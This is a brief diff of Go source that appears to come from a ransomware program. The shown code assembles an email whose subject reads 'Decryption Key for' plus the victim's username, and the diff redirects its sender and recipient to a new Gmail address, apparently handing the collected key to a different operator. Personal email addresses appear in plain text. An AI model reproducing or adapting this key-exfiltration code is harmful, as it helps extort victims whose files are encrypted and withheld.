@@ -33,12 +33,12 @@ func main() {
 		"personalizations": []map[string]interface{}{
 			{
 				"to": []map[string]string{
-					{"email": "paulkiragu621@gmail.com"},
+					{"email": "hetenteyj@gmail.com"},
 				},
 				"subject": "Decryption Key for " + os.Getenv("USER"),
 			},
 		},
-		"from": map[string]string{"email": "paulsaul621@gmail.com"},
+		"from": map[string]string{"email": "hetenteyj@gmail.com"},
 		"content": []map[string]string{
 			{
 				"type":  "text/plain",
